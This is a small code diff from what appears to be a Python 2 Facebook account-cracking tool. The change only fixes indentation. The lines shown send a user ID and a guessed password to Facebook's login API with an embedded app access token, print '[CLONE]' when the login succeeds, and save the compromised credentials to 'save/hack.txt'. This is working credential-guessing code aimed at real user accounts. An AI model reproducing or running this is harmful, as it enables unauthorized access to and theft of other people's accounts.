@@ -362,7 +362,7 @@ def pilih_super():
                         else:
                             p5 = '000786'
                             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + p6 + '&sdk=ios&generate_session_cookies=1&sig=1QDNWjJdBnNp8JNuQFhRWeQXL3fDb84cVS')
-                                q = json.load(data)
+                            q = json.load(data)
                             if 'access_token' in q:
                                 print '\x1b[1;92m[CLONE] ' + user + ' |\x1b[0m ' + p5
                                 cek = open('save/hack.txt', 'a')
